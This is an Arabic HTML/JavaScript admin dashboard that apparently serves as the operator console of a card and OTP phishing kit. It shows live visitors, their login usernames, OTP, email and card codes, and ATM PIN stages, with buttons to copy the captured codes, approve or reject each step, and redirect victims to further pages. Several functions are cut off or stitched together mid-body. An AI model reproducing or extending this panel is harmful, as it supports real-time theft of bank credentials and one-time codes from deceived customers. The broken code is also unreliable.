<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة الإدارة</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
  background:linear-gradient(135deg,#0f172a 0%,#1e293b 100%);color:#fff}
::-webkit-scrollbar{width:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:4px}

.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.login-box{background:rgba(30,41,59,.8);border:1px solid rgba(51,65,85,.5);border-radius:24px;
  padding:48px 40px;width:100%;max-width:420px;box-shadow:0 25px 60px rgba(0,0,0,.4);text-align:center;backdrop-filter:blur(10px)}
.login-box h1{font-size:24px;font-weight:800;margin:16px 0 6px}
.login-box .sub{color:rgba(255,255,255,.5);font-size:13px;margin-bottom:32px}
.login-box input{width:100%;padding:14px 18px;border:1.5px solid rgba(51,65,85,.5);border-radius:12px;
  font-size:15px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px;background:#0f172a;color:#fff;transition:.2s}
.login-box input:focus{border-color:#1B7A3D}
.login-box button{width:100%;padding:14px;background:linear-gradient(135deg,#1B7A3D,#16a34a);color:#fff;border:none;
  border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
.login-err{color:#f87171;font-size:12px;margin-bottom:10px;display:none}

.layout{display:none;flex-direction:column;height:100vh;overflow:hidden}

.topbar{background:rgba(15,23,42,.95);backdrop-filter:blur(10px);padding:12px 24px;
  display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(27,122,61,.3)}
.tb-r{display:flex;align-items:center;gap:12px}
.tb-r .ico{width:36px;height:36px;background:linear-gradient(135deg,#1B7A3D,#16a34a);border-radius:10px;
  display:flex;align-items:center;justify-content:center;font-size:18px}
.tb-r .t{color:#1B7A3D;font-weight:800;font-size:16px}
.tb-r .sp{color:rgba(255,255,255,.4);font-size:13px}
.tb-r .bn{color:rgba(255,255,255,.5);font-size:13px}
.tb-l{display:flex;align-items:center;gap:12px}
.tb-visitors{display:inline-flex;align-items:center;gap:8px;background:rgba(245,158,11,.18);
  border:1px solid rgba(245,158,11,.45);color:#fbbf24;border-radius:999px;padding:6px 14px;
  font-size:13px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;transition:.2s}
.tb-visitors:hover{background:rgba(245,158,11,.28)}
.tb-visitors .num{background:rgba(245,158,11,.35);padding:2px 8px;border-radius:10px;color:#fff;font-weight:800;min-width:24px;text-align:center}
.tb-online{display:inline-flex;align-items:center;gap:6px;color:#86efac;background:rgba(34,197,94,.12);
  border:1px solid rgba(34,197,94,.3);border-radius:999px;padding:6px 10px;font-size:12px;font-weight:700}
.tb-online .dot{width:7px;height:7px;border-radius:50%;background:#22c55e;box-shadow:0 0 7px #22c55e}
.tb-admin{color:rgba(255,255,255,.6);font-size:13px}
.tb-logout{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.3);color:#f87171;
  border-radius:8px;padding:6px 16px;cursor:pointer;font-size:13px;font-family:'Cairo',sans-serif;font-weight:700}

.stats{padding:16px 24px;display:grid;grid-template-columns:repeat(5,1fr);gap:16px;
  border-bottom:1px solid rgba(255,255,255,.06);flex-shrink:0}
.sc{border-radius:14px;padding:14px 16px;text-align:center;transition:.15s;cursor:default}
.sc:hover{transform:translateY(-2px)}
.sc-v{font-size:24px;font-weight:800;display:flex;align-items:center;justify-content:center;gap:6px}
.sc-v .live{width:8px;height:8px;border-radius:50%;display:inline-block;animation:pulse 1.5s infinite}
.sc-lb{font-size:12px;color:rgba(255,255,255,.5);margin-top:4px}
.sc-hint{font-size:10px;margin-top:2px;font-weight:700}

.body{display:flex;height:calc(100vh - 160px)}

.col-a{width:280px;border-left:1px solid rgba(255,255,255,.06);overflow-y:auto;flex-shrink:0;background:rgba(59,130,246,.03)}
.col-a-head{padding:12px 16px;border-bottom:1px solid rgba(255,255,255,.06);background:rgba(59,130,246,.08);
  position:sticky;top:0;z-index:1;display:flex;align-items:center;gap:8px;font-weight:800;font-size:13px;color:#3b82f6}
.col-a-head .gd{width:8px;height:8px;border-radius:50%;background:#22c55e;box-shadow:0 0 6px #22c55e;animation:pulse 1.5s infinite}
.ac{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);cursor:pointer;transition:.15s}
.ac:hover{background:rgba(59,130,246,.08)}
.ac.sel{background:rgba(59,130,246,.15)}
.ac-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
.ac-n{font-weight:700;font-size:12px}
.pg-badge{color:#fff;border-radius:8px;padding:1px 6px;font-size:9px;font-weight:700;display:inline-block}
.ac-info{display:flex;gap:8px;font-size:10px;color:rgba(255,255,255,.5)}
.ac-info .otp{color:#fbbf24;font-weight:700}
.al-empty{padding:30px 20px;text-align:center;color:rgba(255,255,255,.3)}
.al-empty .ic{font-size:32px;margin-bottom:6px}
.al-empty p{font-size:12px}

.col-o{width:320px;border-left:1px solid rgba(255,255,255,.06);overflow-y:auto;flex-shrink:0}
.col-o-head{padding:12px 14px;border-bottom:1px solid rgba(255,255,255,.06);background:rgba(27,122,61,.06);position:sticky;top:0;z-index:1}
.col-o-head .t{font-weight:800;font-size:13px;color:#1B7A3D;margin-bottom:8px}
.col-o-head input{width:100%;padding:8px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);
  border-radius:8px;color:#fff;font-size:12px;font-family:'Cairo',sans-serif;outline:none;box-sizing:border-box}
.oc{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.04);cursor:pointer;transition:.15s;position:relative}
.oc:hover{background:rgba(27,122,61,.06)}
.oc.sel{background:rgba(27,122,61,.15)}
.oc-t{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.oc-nm{display:flex;align-items:center;gap:6px}
.oc-nm span{font-weight:700;font-size:12px}
.oc-info{color:rgba(255,255,255,.4);font-size:10px}
.oc-otp{display:inline-block;margin-top:4px;background:rgba(245,158,11,.15);border-radius:4px;
  padding:1px 6px;font-size:10px;color:#fbbf24;font-weight:700}
.oc-del{position:absolute;top:6px;left:6px;border-radius:5px;padding:2px 6px;font-size:10px;
  cursor:pointer;font-family:'Cairo',sans-serif;font-weight:700;transition:.15s}
.oc-del.normal{background:rgba(220,38,38,.1);border:1px solid rgba(220,38,38,.2);color:#f87171}
.oc-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}
.ol-empty{padding:40px 20px;text-align:center;color:rgba(255,255,255,.3)}
.ol-empty .ic{font-size:40px;margin-bottom:10px}
.ol-empty p{font-size:13px}

.col-d{flex:1;overflow-y:auto;padding:20px 24px}
.d-empty{display:flex;align-items:center;justify-content:center;height:100%;color:rgba(255,255,255,.3);
  flex-direction:column;gap:12px}
.d-empty .ic{font-size:56px}

.dh{background:rgba(255,255,255,.04);border-radius:14px;padding:16px 20px;margin-bottom:16px;
  border:1px solid rgba(255,255,255,.08);display:flex;align-items:center;justify-content:space-between}
.dh-left{display:flex;align-items:center;gap:14px}
.dh-av{width:44px;height:44px;background:linear-gradient(135deg,#1B7A3D,#16a34a);border-radius:12px;
  display:flex;align-items:center;justify-content:center;font-size:20px;overflow:hidden}
.dh-av img{width:100%;height:100%;object-fit:contain}
.dh-name{font-weight:800;font-size:18px}
.dh-meta{display:flex;align-items:center;gap:8px;margin-top:4px;flex-wrap:wrap}
.dh-time{color:rgba(255,255,255,.4);font-size:11px}
.dh-del{border-radius:8px;padding:6px 14px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.dh-del.normal{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.3);color:#f87171}
.dh-del.confirm{background:#dc2626;border:1px solid #ef4444;color:#fff}

.sec-codes{background:linear-gradient(135deg,rgba(245,158,11,.1),rgba(245,158,11,.03));
  border:1px solid rgba(245,158,11,.3);border-radius:14px;padding:16px;margin-bottom:16px}
.sec-codes h3{font-weight:800;font-size:14px;color:#f59e0b;margin:0 0 12px}
.codes-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.code-card{background:rgba(0,0,0,.3);border-radius:10px;padding:12px;border:1px solid rgba(245,158,11,.2);text-align:center}
.code-card .lbl{font-size:10px;color:rgba(255,255,255,.5);margin-bottom:4px}
.code-card .val{font-weight:800;font-size:18px;color:#fbbf24;letter-spacing:2px;font-family:monospace;word-break:break-all;direction:ltr;unicode-bidi:embed}
.code-card .cp{margin-top:6px;background:rgba(255,255,255,.08);border:none;border-radius:6px;padding:3px 8px;
  color:#fff;font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
.code-card .cp.ok{color:#4ade80}
.code-empty{background:rgba(0,0,0,.15);border-radius:10px;padding:12px;border:1px dashed rgba(255,255,255,.08);text-align:center}
.code-empty .lbl{font-size:10px;color:rgba(255,255,255,.3);margin-bottom:4px}
.code-empty .val{color:rgba(255,255,255,.3);font-size:12px}

.sec-data{background:rgba(255,255,255,.03);border-radius:14px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,.06)}
.sec-data h3{font-weight:800;font-size:14px;color:#1B7A3D;margin:0 0 12px}
.data-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.data-item{background:rgba(255,255,255,.04);border-radius:10px;padding:12px;position:relative}
.data-item.hl{border:1px solid rgba(245,158,11,.2)}
.data-item:not(.hl){border:1px solid rgba(255,255,255,.06)}
.data-item .lbl{color:rgba(255,255,255,.4);font-size:10px;margin-bottom:4px;display:flex;align-items:center;gap:4px}
.data-item .val{font-weight:700;font-size:13px;word-break:break-all}
.data-item .val.hl{color:#fbbf24}
.data-item .cp{margin-top:6px;background:rgba(255,255,255,.06);border:none;border-radius:5px;padding:2px 8px;
  color:rgba(255,255,255,.5);font-size:10px;cursor:pointer;font-family:'Cairo',sans-serif}
.data-item .cp.ok{color:#4ade80}

.sec-ctrl{background:rgba(255,255,255,.03);border-radius:14px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,.06)}
.sec-ctrl h4{font-weight:700;font-size:14px;margin:0 0 12px}
.approve-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
.approve-row button{border:none;border-radius:8px;padding:10px;font-size:12px;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
.btn-ok{background:#16a34a;color:#fff}
.btn-no{background:#dc2626;color:#fff}
.btn-ok.disabled,.btn-no.disabled{background:#9ca3af;cursor:not-allowed;opacity:.6}
.redir-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:8px}
.redir-grid button{border:none;border-radius:8px;padding:8px 6px;font-size:11px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif;color:#fff;transition:.15s}
.redir-grid button:hover{opacity:.85}

.sec-del{background:rgba(220,38,38,.05);border-radius:14px;padding:16px;border:1px solid rgba(220,38,38,.2);margin-bottom:16px}
.sec-del h4{font-weight:700;font-size:14px;color:#f87171;margin:0 0 10px;display:flex;align-items:center;gap:8px}
.sec-del .del-msg{padding:8px 10px;border-radius:8px;margin-bottom:10px;font-size:12px;font-weight:700;text-align:center;display:none}
.sec-del .del-msg.ok{background:rgba(22,163,74,.2);color:#4ade80;border:1px solid rgba(22,163,74,.4);display:block}
.sec-del .del-msg.err{background:rgba(220,38,38,.2);color:#ef4444;border:1px solid rgba(220,38,38,.4);display:block}
.btn-del-one{width:100%;background:linear-gradient(135deg,#dc2626,#991b1b);color:#fff;border:1px solid rgba(220,38,38,.4);
  border-radius:8px;padding:10px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:'Cairo',sans-serif;
  box-shadow:0 4px 12px rgba(220,38,38,.2)}
.del-confirm-row{display:flex;gap:8px}
.del-confirm-row button{flex:1;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif}
.del-warn{color:#fbbf24;font-size:12px;font-weight:700;margin-bottom:10px;text-align:center}
.sec-del .note{color:rgba(255,255,255,.4);font-size:11px;margin-top:8px}

.modal-bg{display:none;position:fixed;inset:0;background:rgba(10,15,29,.82);backdrop-filter:blur(10px);
  z-index:9999;align-items:center;justify-content:center;padding:20px}
.modal-bg.show{display:flex}
.modal{background:#0f172a;border:1px solid rgba(245,158,11,.35);border-radius:20px;
  width:100%;max-width:860px;max-height:90vh;display:flex;flex-direction:column;
  box-shadow:0 25px 65px rgba(0,0,0,.65);overflow:hidden}
.modal-head{padding:18px 24px;border-bottom:1px solid rgba(255,255,255,.08);display:flex;
  align-items:center;justify-content:space-between;background:rgba(245,158,11,.05)}
.modal-head h3{font-size:17px;font-weight:800;color:#f59e0b}
.modal-head p{font-size:12px;color:rgba(255,255,255,.5);margin-top:2px}
.modal-head .btns{display:flex;gap:8px}
.modal-head .btns button{border-radius:8px;padding:6px 12px;font-size:12px;font-weight:700;
  cursor:pointer;font-family:'Cairo',sans-serif}
.modal-body{padding:20px 24px;overflow-y:auto;flex:1}
.vm-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:20px}
.vm-sc{border-radius:14px;padding:14px;text-align:center}
.vm-sc .n{font-size:26px;font-weight:800}
.vm-sc .l{font-size:12px;color:rgba(255,255,255,.6);margin-top:4px}
.vm-footer{margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,.08);
  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
.vm-footer .note{font-size:11px;color:rgba(255,255,255,.4)}

.notif{position:fixed;top:16px;left:50%;transform:translateX(-50%);background:#1B7A3D;color:#fff;
  padding:12px 24px;border-radius:12px;font-size:14px;font-weight:700;z-index:10000;
  box-shadow:0 8px 24px rgba(0,0,0,.3);display:none;animation:slideD .3s ease}
@keyframes slideD{from{opacity:0;transform:translateX(-50%) translateY(-20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}

@media(max-width:1100px){.col-a{width:240px}.col-o{width:280px}}
@media(max-width:800px){
  .body{flex-direction:column;overflow-y:auto}
  .col-a,.col-o{width:100%;max-height:220px;overflow-y:auto}
  .col-d{min-height:500px}
  .stats{grid-template-columns:repeat(3,1fr)}
  .codes-grid{grid-template-columns:repeat(2,1fr)!important}
  .topbar{flex-direction:column;gap:8px;padding:10px 14px}
  .tb-l{flex-wrap:wrap;justify-content:center}
}
</style>
</head>
<body>

<div class="notif" id="notif"></div>
<div class="modal-bg" id="vModal"></div>

<div class="login-wrap" id="loginScreen">
  <div class="login-box">
    <div style="font-size:48px">⌚</div>
    <h1>لوحة الإدارة</h1>
    <p class="sub">أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
    <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
    <button onclick="doLogin()">دخول</button>
  </div>
</div>

<div class="layout" id="layout">
  <div class="topbar">
    <div class="tb-r">
      <div class="ico">⌚</div>
      <span class="t">لوحة الإدارة</span>
      <span class="sp">|</span>
      <span class="bn">WLNG</span>
    </div>
    <div class="tb-l">
      <button class="tb-visitors" onclick="openVM()">
        <span>📊</span><span>الطلبات:</span><span class="num" id="tbV">0</span>
      </button>
      <span class="tb-online"><span class="dot"></span> الزوار: <strong id="tbO">0</strong></span>
      <span class="tb-admin">👤 Admin</span>
      <button class="tb-logout" onclick="doLogout()">خروج</button>
    </div>
  </div>

  <div class="stats" id="statsRow"></div>

  <div class="body">
    <div class="col-a">
      <div class="col-a-head"><div class="gd"></div> العملاء النشطين (<span id="aCnt">0</span>)</div>
      <div id="aList"></div>
    </div>
    <div class="col-o">
      <div class="col-o-head">
        <div class="t">📋 جميع الطلبات (<span id="oCnt">0</span>)</div>
        <input type="text" id="sInp" placeholder="🔍 بحث بالاسم أو الهاتف..." oninput="filterOrders()">
      </div>
      <div id="oList"></div>
    </div>
    <div class="col-d" id="colD">
      <div class="d-empty" id="dEmpty"><div class="ic">👈</div><p>اختر طلباً لعرض تفاصيله</p></div>
      <div id="dCont" style="display:none"></div>
    </div>
  </div>
</div>

<script>
var countryNames = {
  AF:"أفغانستان",AL:"ألبانيا",DZ:"الجزائر",AO:"أنغولا",AR:"الأرجنتين",AU:"أستراليا",
  AT:"النمسا",BH:"البحرين",BD:"بنغلاديش",BE:"بلجيكا",BJ:"بنين",BR:"البرازيل",
  BF:"بوركينا فاسو",BI:"بوروندي",CM:"الكاميرون",CA:"كندا",CF:"أفريقيا الوسطى",
  TD:"تشاد",CN:"الصين",CD:"الكونغو",CI:"كوت ديفوار",CU:"كوبا",CY:"قبرص",
  CZ:"التشيك",DK:"الدنمارك",DJ:"جيبوتي",EG:"مصر",GQ:"غينيا الاستوائية",
  ER:"إريتريا",ET:"إثيوبيا",FI:"فنلندا",FR:"فرنسا",GA:"الغابون",GM:"غامبيا",
  DE:"ألمانيا",GH:"غانا",GR:"اليونان",GN:"غينيا",HK:"هونغ كونغ",HU:"المجر",
  IN:"الهند",ID:"إندونيسيا",IR:"إيران",IQ:"العراق",IE:"أيرلندا",IL:"إسرائيل",
  IT:"إيطاليا",JP:"اليابان",JO:"الأردن",KE:"كينيا",KW:"الكويت",LB:"لبنان",
  LR:"ليبيريا",LY:"ليبيا",MG:"مدغشقر",MW:"مالاوي",MY:"ماليزيا",ML:"مالي",
  MR:"موريتانيا",MX:"المكسيك",MA:"المغرب",MZ:"موزمبيق",MM:"ميانمار",NA:"ناميبيا",
  NL:"هولندا",NZ:"نيوزيلندا",NE:"النيجر",NG:"نيجيريا",NO:"النرويج",OM:"عمان",
  PK:"باكستان",PS:"فلسطين",PH:"الفلبين",PL:"بولندا",PT:"البرتغال",QA:"قطر",
  RO:"رومانيا",RU:"روسيا",RW:"رواندا",SA:"السعودية",SN:"السنغال",RS:"صربيا",
  SL:"سيراليون",SG:"سنغافورة",SO:"الصومال",ZA:"جنوب أفريقيا",SS:"جنوب السودان",
  ES:"إسبانيا",SD:"السودان",SE:"السويد",CH:"سويسرا",SY:"سوريا",TW:"تايوان",
  TZ:"تنزانيا",TH:"تايلند",TG:"توغو",TN:"تونس",TR:"تركيا",UG:"أوغندا",
  UA:"أوكرانيا",AE:"الإمارات",GB:"بريطانيا",US:"أمريكا",UY:"أوروغواي",VE:"فنزويلا",
  VN:"فيتنام",YE:"اليمن",ZM:"زامبيا",ZW:"زيمبابوي",
  KH:"كمبوديا"
};
function countryFlag(code){
  if(!code||code.length!==2)return"🌍";
  return String.fromCodePoint(...[...code.toUpperCase()].map(function(c){return 0x1F1E6+c.charCodeAt(0)-65;}));
}
function countryDisplay(code){

function getSeenMap(){try{return JSON.parse(localStorage.getItem("admin_seen")||"{}");}catch(e){return {};}}
function markSeen(id,status){var m=getSeenMap();m[id]=status;try{localStorage.setItem("admin_seen",JSON.stringify(m));}catch(e){}}
function isNewOrder(o){
  var expectedPage=dataWaitingPages[o.status];
  if(!expectedPage||o.current_page!==expectedPage)return false;
  var m=getSeenMap();
  return m[o.id]!==o.status;
}

function getStatusLabel(o){
  if(o.status&&(o.status.indexOf("confirmed")!==-1||o.status.indexOf("rejected")!==-1)){
    return statusLabels[o.status]||o.status;
  }
  var expectedPage=dataWaitingPages[o.status];
  if(expectedPage&&o.current_page===expectedPage){
    var dataLabel;
    if(o.status==="pending") dataLabel=(o.login_username?"بيانات تسجيل دخول":"بيانات شخصية");
    else dataLabel=statusLabels[o.status]||o.status;
    if(isNewOrder(o)) return '<span style="background:#dc2626;color:#fff;font-size:9px;padding:1px 6px;border-radius:8px;margin-left:4px;animation:pulse 1.5s infinite">جديد</span>'+dataLabel;
    return dataLabel;
  }
  var page=pageLabels[o.current_page]||o.current_page||"—";
  return page;
}

var TOKEN=localStorage.getItem("admin_token")||"";

function api(method,url,body){
  var hdrs={"Content-Type":"application/json"};
  if(TOKEN) hdrs["Authorization"]="Bearer "+TOKEN;
  var opts={method:method,headers:hdrs};
  if(body) opts.body=JSON.stringify(body);
  return fetch(url,opts).then(function(r){
    if(r.status===401&&url!=="/api/admin/login"){
      TOKEN="";localStorage.removeItem("admin_token");
      document.getElementById("layout").style.display="none";
      document.getElementById("loginScreen").style.display="flex";
    }
    return r.json();
  });
}

function doLogin(){
  var pw=document.getElementById("passInput").value;
  api("POST","/api/admin/login",{password:pw}).then(function(res){
    if(res.success){
      TOKEN=res.token;localStorage.setItem("admin_token",TOKEN);showDash();
    } else {
      document.getElementById("loginErr").style.display="block";
    }
  }).catch(function(){document.getElementById("loginErr").style.display="block";});
}
function doLogout(){TOKEN="";localStorage.removeItem("admin_token");
  document.getElementById("layout").style.display="none";document.getElementById("loginScreen").style.display="flex";}
document.getElementById("passInput").addEventListener("keydown",function(e){if(e.key==="Enter")doLogin();});

function checkAuth(){
  if(!TOKEN)return;
  fetch("/api/orders",{headers:{"Authorization":"Bearer "+TOKEN}}).then(function(r){
    if(r.status===200){r.json().then(function(d){if(d.orders)showDash();else{TOKEN="";localStorage.removeItem("admin_token");}});}
    else{TOKEN="";localStorage.removeItem("admin_token");}
  }).catch(function(){});
}

  document.getElementById("layout").style.display="flex";loadOrders();loadActiveVisitors();}

function playSound(){try{var c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();
  o.connect(g);g.connect(c.destination);g.gain.setValueAtTime(.3,c.currentTime);o.type='sine';
  o.frequency.setValueAtTime(800,c.currentTime);o.frequency.setValueAtTime(1200,c.currentTime+.1);
  g.gain.exponentialRampToValueAtTime(.01,c.currentTime+.4);o.start(c.currentTime);o.stop(c.currentTime+.4);}catch(e){}}

function fmtDate(ts){if(!ts)return'—';try{var d=new Date(ts);
  return d.toLocaleDateString('ar-EG',{year:'numeric',month:'2-digit',day:'2-digit'})+' '+
  d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit',hour12:true});}catch(e){return'—';}}

function isActive(o){
  if(o.status==='confirmed'||o.status==='rejected'||
     o.status==='code_confirmed'||o.status==='code_rejected'||
     o.status==='email_code_confirmed'||o.status==='email_code_rejected'||
     o.status==='card_confirmed'||o.status==='card_rejected'||
     o.status==='atm_confirmed'||o.status==='atm_rejected') return false;
  var last=o.updated_at||o.created_at;
  if(!last)return true;
  return(Date.now()-new Date(last).getTime())<600000;
}

function codeCard(lbl,val){
  if(!val)return '<div class="code-empty"><div class="lbl">'+lbl+'</div><div class="val">لم يُسجل بعد</div></div>';
  return '<div class="code-card"><div class="lbl">'+lbl+'</div><div class="val">'+esc(val)+'</div>'+
    '<button class="cp" data-copy="'+esc(val)+'" onclick="doCopy(this)">📋 نسخ</button></div>';
}

function doCopy(btn){
  var txt=btn.getAttribute("data-copy");
  navigator.clipboard.writeText(txt).then(function(){
    btn.classList.add("ok");var old=btn.textContent;btn.textContent='✅ تم';
    setTimeout(function(){btn.classList.remove("ok");btn.textContent=old;},1500);
  });
}

    setTimeout(function(){if(detDelConf){detDelConf=false;var o2=orders.find(function(x){return x.id===id;});if(o2)renderDetail(o2);}},3000);}
}

  });
}
function cancelDelOne(id){var o=orders.find(function(x){return x.id===id;});if(o)renderDetail(o);}

function doDecide(id,status){
  api("PATCH","/api/orders/"+id,{status:status}).then(function(){
    showNotif(status.indexOf('confirmed')!==-1?'✅ تم القبول':'❌ تم الرفض');loadOrders();});
}
function doRedir(id,page){
  api("PATCH","/api/orders/"+id,{redirect_to:page}).then(function(){
    showNotif('✅ تم إعادة التوجيه');loadOrders();});
}

function loadOrders(){
  api("GET","/api/orders").then(function(r){
    var nw=r.orders||[];
    var nids=new Set(nw.map(function(o){return o.id;}));
    if(prevIds.size>0){var fresh=nw.filter(function(o){return!prevIds.has(o.id);});
      if(fresh.length){playSound();showNotif('🔔 طلب جديد: '+(fresh[0].name||fresh[0].phone||'—'));}}
    prevIds=nids;orders=nw;
    renderStats();renderActive();renderOrders();
    if(selId){var o=orders.find(function(x){return x.id===selId;});if(o)renderDetail(o);else closeDetail();}
  }).catch(function(){});
}

function loadActiveVisitors(){
  if(!TOKEN)return;
  api("GET","/api/visitors/active").then(function(r){
    onlineCount=r.count||0;renderStats();
  }).catch(function(){});
}

function openVM(){
  var activeOrd=orders.filter(isActive).length;
  var pendingLike=orders.filter(function(o){return o.status==='pending'||o.status==='code_pending'||o.status==='email_code_pending'||o.status==='card_pending'||o.status==='atm_pending';}).length;
  var h='<div class="modal"><div class="modal-head"><div><div style="display:flex;align-items:center;gap:10px">'+
    '<span style="font-size:24px">📊</span><div><h3 style="margin:0">إحصائيات الزوار والطلبات</h3>'+
    '<p style="margin:2px 0 0;font-size:12px;color:rgba(255,255,255,.5)">متابعة حركة زوار الموقع</p></div></div></div>'+
    '<div class="btns"><button style="background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);color:#fff" onclick="loadOrders();openVM()">🔄 تحديث</button>'+
    '<button style="background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.25);color:#f87171" onclick="closeVM()">✕ إغلاق</button></div></div>';

  h+='<div class="modal-body">';
  h+='<div class="vm-stats" style="grid-template-columns:repeat(4,1fr)">'+
    '<div class="vm-sc" style="background:rgba(27,122,61,.1);border:1px solid rgba(27,122,61,.25)">'+
    '<div class="n" style="color:#1B7A3D">'+orders.length+'</div><div class="l">إجمالي الطلبات</div></div>'+
    '<div class="vm-sc" style="background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25)">'+
    '<div class="n" style="color:#22c55e;display:flex;align-items:center;justify-content:center;gap:6px">'+
    '<span style="width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block"></span>'+onlineCount+'</div>'+
    '<div class="l">الزوار الحاليين</div></div>'+
    '<div class="vm-sc" style="background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25)">'+
    '<div class="n" style="color:#3b82f6">'+activeOrd+'</div><div class="l">طلبات نشطة</div></div>'+
    '<div class="vm-sc" style="background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.25)">'+
    '<div class="n" style="color:#f59e0b">'+pendingLike+'</div><div class="l">قيد الانتظار</div></div></div>';

  h+='<div class="vm-footer"><span class="note">يتم تحديث البيانات تلقائياً كل 3 ثوانٍ</span></div>';
  h+='</div></div>';
  document.getElementById("vModal").innerHTML=h;
  document.getElementById("vModal").classList.add("show");
}
function closeVM(){document.getElementById("vModal").classList.remove("show");document.getElementById("vModal").innerHTML="";}

checkAuth();
setInterval(function(){if(TOKEN){loadOrders();loadActiveVisitors();}},3000);
</script>
</body>
</html>
